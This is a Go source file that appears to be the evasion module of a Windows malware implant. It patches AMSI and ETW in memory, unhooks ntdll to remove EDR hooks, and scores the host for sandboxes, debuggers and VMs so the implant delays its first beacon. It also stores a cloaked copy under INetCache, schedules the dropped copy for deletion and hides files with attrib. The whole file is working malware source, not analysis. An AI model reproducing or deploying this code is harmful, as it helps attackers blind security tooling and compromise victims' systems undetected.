//go:build windows

package main

import (
	"encoding/binary"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// Process hardening and analysis-host detection.
//
// Everything here is best effort: a failure on an exotic Windows build must
// never stop the beacon, so every step swallows its error.

var (
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	procVirtualProtect = kernel32.NewProc("VirtualProtect")
	procIsDebugger     = kernel32.NewProc("IsDebuggerPresent")
	procCheckRemote    = kernel32.NewProc("CheckRemoteDebuggerPresent")
	procMemStatus      = kernel32.NewProc("GlobalMemoryStatusEx")
	procTickCount      = kernel32.NewProc("GetTickCount64")
	procMoveFileEx     = kernel32.NewProc("MoveFileExW")
	procGetCurrentProc = kernel32.NewProc("GetCurrentProcess")
	procOpenProcess    = kernel32.NewProc("OpenProcess")
	procCloseHandle    = kernel32.NewProc("CloseHandle")
)

const pageExecuteReadWrite = 0x40

func pageRW(addr uintptr, n int) bool {
	if addr == 0 || n <= 0 {
		return false
	}
	var old uint32
	r, _, _ := procVirtualProtect.Call(addr, uintptr(n), pageExecuteReadWrite,
		uintptr(unsafe.Pointer(&old)))
	return r != 0
}

func patchBytes(addr uintptr, patch []byte) bool {
	if !pageRW(addr, len(patch)) {
		return false
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(dst, patch)
	return true
}

// patchAmsi makes every AMSI scan return E_INVALIDARG, so PowerShell/.NET
// payloads are never inspected.
func patchAmsi() {
	amsi := syscall.NewLazyDLL("amsi.dll")
	if err := amsi.Load(); err != nil {
		return
	}
	// mov eax, 0x80070057 ; ret
	stub := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	patchBytes(amsi.NewProc("AmsiScanBuffer").Addr(), stub)
	patchBytes(amsi.NewProc("AmsiOpenSession").Addr(), stub)
}

// patchEtw blinds ETW telemetry by neutering EtwEventWrite.
func patchEtw() {
	// xor eax, eax ; ret
	patchBytes(ntdll.NewProc("EtwEventWrite").Addr(), []byte{0x33, 0xC0, 0xC3})
}

// unhookNtdll restores the in-memory .text of ntdll from a clean copy on disk,
// removing userland EDR hooks.
func unhookNtdll() {
	raw, err := os.ReadFile(`C:\Windows\System32\ntdll.dll`)
	if err != nil || len(raw) < 0x200 || raw[0] != 'M' || raw[1] != 'Z' {
		return
	}
	lf := int(binary.LittleEndian.Uint32(raw[0x3C:]))
	if lf <= 0 || lf+24 >= len(raw) {
		return
	}
	numSect := int(binary.LittleEndian.Uint16(raw[lf+6:]))
	optSize := int(binary.LittleEndian.Uint16(raw[lf+20:]))
	sect := lf + 24 + optSize
	base := uintptr(ntdll.Handle())

	for i := 0; i < numSect; i++ {
		s := sect + i*40
		if s+40 > len(raw) {
			return
		}
		chars := binary.LittleEndian.Uint32(raw[s+36:])
		if chars&0x20000000 == 0 { // IMAGE_SCN_MEM_EXECUTE
			continue
		}
		vsize := int(binary.LittleEndian.Uint32(raw[s+8:]))
		vaddr := int(binary.LittleEndian.Uint32(raw[s+12:]))
		rsize := int(binary.LittleEndian.Uint32(raw[s+16:]))
		raddr := int(binary.LittleEndian.Uint32(raw[s+20:]))
		if vsize <= 0 || rsize <= 0 || raddr+rsize > len(raw) {
			continue
		}
		dst := base + uintptr(vaddr)
		if !pageRW(dst, vsize) {
			continue
		}
		copy(unsafe.Slice((*byte)(unsafe.Pointer(dst)), rsize), raw[raddr:raddr+rsize])
	}
}

func hardenProcess() {
	patchAmsi()
	patchEtw()
	unhookNtdll()
}

// sandboxScore counts analysis-host indicators. Two or more and the implant
// stalls before its first beacon.
func sandboxScore() int {
	score := 0

	if r, _, _ := procIsDebugger.Call(); r != 0 {
		score++
	}
	var remote int32
	self, _, _ := procGetCurrentProc.Call()
	procCheckRemote.Call(self, uintptr(unsafe.Pointer(&remote)))
	if remote != 0 {
		score++
	}

	// an accelerated clock (sleep skipping) is the classic sandbox tell
	t0, _, _ := procTickCount.Call()
	time.Sleep(900 * time.Millisecond)
	t1, _, _ := procTickCount.Call()
	if t0 != 0 && t1 > t0 && t1-t0 < 700 {
		score++
	}

	if runtime.NumCPU() < 2 {
		score++
	}

	var mem struct {
		length, load                   uint32
		total, avail                   uint64
		totalPage, availPage           uint64
		totalVirt, availVirt, availExt uint64
	}
	mem.length = uint32(unsafe.Sizeof(mem))
	if r, _, _ := procMemStatus.Call(uintptr(unsafe.Pointer(&mem))); r != 0 &&
		mem.total > 0 && mem.total < 2<<30 {
		score++
	}

	host, _ := os.Hostname()
	ident := strings.ToLower(host + "|" + os.Getenv("USERNAME"))
	for _, marker := range []string{"sandbox", "virus", "malware", "cuckoo",
		"maltest", "analyst", "vmware", "virtualbox", "win-", "desktop-"} {
		if strings.Contains(ident, marker) {
			score++
			break
		}
	}

	for _, drv := range []string{
		`C:\Windows\System32\drivers\VBoxGuest.sys`,
		`C:\Windows\System32\drivers\vmhgfs.sys`,
		`C:\Windows\System32\drivers\vmmouse.sys`,
		`C:\Windows\System32\drivers\xen.sys`,
		`C:\Windows\System32\drivers\PROCMON23.SYS`,
	} {
		if _, err := os.Stat(drv); err == nil {
			score++
			break
		}
	}
	return score
}

// cloakPath is the location a shadow copy of the implant lives in.
func cloakPath() string {
	base := os.Getenv("LOCALAPPDATA")
	if base == "" {
		base = os.TempDir()
	}
	exe, _ := os.Executable()
	name := filepath.Base(exe)
	if !strings.HasSuffix(strings.ToLower(name), ".exe") {
		name += ".exe"
	}
	return filepath.Join(base, "Microsoft", "Windows", "INetCache", name)
}

func alive(pid int) bool {
	h, _, _ := procOpenProcess.Call(0x1000 /* PROCESS_QUERY_LIMITED_INFORMATION */, 0, uintptr(pid))
	if h == 0 {
		return false
	}
	procCloseHandle.Call(h)
	return true
}

// scheduleSelfDelete removes a file on the next boot (used for the dropped
// copy once persistence owns a cloaked one).
func scheduleSelfDelete(path string) bool {
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return false
	}
	r, _, _ := procMoveFileEx.Call(uintptr(unsafe.Pointer(p)), 0, 0x4)
	return r != 0
}

// hideFile marks a path hidden + system so Explorer and `dir` skip it.
func hideFile(path string) {
	newCmd("attrib", "+h", "+s", path).Run()
}
